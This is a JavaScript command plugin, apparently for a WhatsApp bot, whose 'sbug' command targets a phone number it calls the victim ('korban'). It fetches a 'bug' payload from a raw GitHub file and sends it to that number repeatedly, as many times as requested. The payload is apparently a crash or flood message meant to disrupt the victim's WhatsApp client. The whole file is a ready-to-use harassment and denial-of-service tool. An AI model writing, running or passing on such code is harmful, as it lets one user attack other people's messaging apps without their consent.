let handler = async(m, {conn, text, usedPrefix}) => {
    let [nomor, jumlah] = text.split `|`

    if (!nomor) return conn.reply(m.chat, `Penggunaan salah!\ncontoh ${usedPrefix}sbug nomor|jumlah`)
    if (!jumlah) return conn.reply(m.chat, `Penggunaan salah!\ncontoh ${usedPrefix}sbug nomor|jumlah`)

    let user = global.db.data.users[m.sender]

    let korban = `${nomor}`

    let bug = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
    for (let i = 0; i < jumlah; i++) {
        if (i !== 0) conn.reply(nomor + '@s.whatsapp.net', bug, m)
    }
    m.reply(`Sukses mengirim bug ke nomor ${nomor} dengan jumlah ${jumlah}`)
}
handler.command = /^(sbug)$/i

module.exports = handler